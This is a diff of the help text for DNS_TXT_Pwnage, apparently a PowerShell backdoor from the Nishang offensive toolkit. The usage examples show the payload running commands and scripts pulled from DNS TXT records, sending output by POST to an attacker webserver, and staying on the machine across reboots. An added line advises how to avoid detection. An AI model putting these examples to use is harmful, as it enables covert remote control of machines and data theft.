@@ -53,13 +53,15 @@ Password for the pastebin/gmail account where data would be exfiltrated.
 Unused for other options
 
 .PARAMETER URL
-The URL of the webserver where POST requests would be sent.
+The URL of the webserver where POST requests would be sent. The Webserver must beb able to log the POST requests.
+The encoded values from the webserver could be decoded bby using Invoke-Decode from Nishang.
 
 .PARAMETER DomainName
-The DomainName, whose subdomains would be used for sending TXT queries to.
+The DomainName, whose subdomains would be used for sending TXT queries to. The DNS Server must log the TXT queries.
 
 .PARAMETER ExfilNS
-Authoritative Name Server for the domain specified in DomainName.
+Authoritative Name Server for the domain specified in DomainName. Using it may increase chances of detection.
+Usually, you should let the Name Server of target to resolve things for you.
 
 .PARAMETER persist
 Use this parameter for reboot persistence
@@ -74,7 +76,7 @@ PS > DNS_TXT_Pwnage
 The payload will ask for all required options.
 
 .EXAMPLE
-PS > DNS_TXT_Pwnage start.alteredsecurity.com begincommands command.alteredsecurity.com startscript encscript.alteredsecurity.com stop ns8.zoneedit.com
+PS > DNS_TXT_Pwnage -StartDomain start.alteredsecurity.com -cmdstring begincommands -CommandDomain command.alteredsecurity.com -psstring startscript -PSDomain encscript.alteredsecurity.com -StopString stop -AuthNS ns8.zoneedit.com
 In the above example if you want to execute commands. TXT record of start.alteredsecurity.com
 must contain only "begincommands" and command.alteredsecurity.com should conatin a single command 
 you want to execute. The TXT record could be changed live and the payload will pick up updated 
@@ -84,11 +86,11 @@ To execute a script in above example, start.alteredsecurity.com must contain "st
 psdomain looking for a base64encoded powershell script. Use the StringToBase64 function to encode scripts to base64.
 
 .EXAMPLE
-PS > DNS_TXT_Pwnage start.alteredsecurity.com begincommands command.alteredsecurity.com startscript encscript.alteredsecurity.com stop ns8.zoneedit.com -exfil -ExfilOption Webserver -URL http://192.168.254.183/catchpost.php
-Use above command for using sending POST request to your webserver which is able to log the requests.
+PS > DNS_TXT_Pwnage -StartDomain start.alteredsecurity.com -cmdstring begincommands -CommandDomain command.alteredsecurity.com -psstring startscript -PSDomain encscript.alteredsecurity.com -StopString stop -AuthNS ns8.zoneedit.com -exfil -ExfilOption Webserver -URL http://192.168.254.183/catchpost.php
+Use above command for sending POST request to your webserver which is able to log the requests.
 
 .EXAMPLE
-PS > DNS_TXT_Pwnage -persist
+PS > DNS_TXT_Pwnage -StartDomain start.alteredsecurity.com -cmdstring begincommands -CommandDomain command.alteredsecurity.com -psstring startscript -PSDomain encscript.alteredsecurity.com -StopString stop -AuthNS ns8.zoneedit.com -exfil -ExfilOption Webserver -URL http://192.168.254.183/catchpost.php -persist
 Use above for reboot persistence.
 
 .LINK
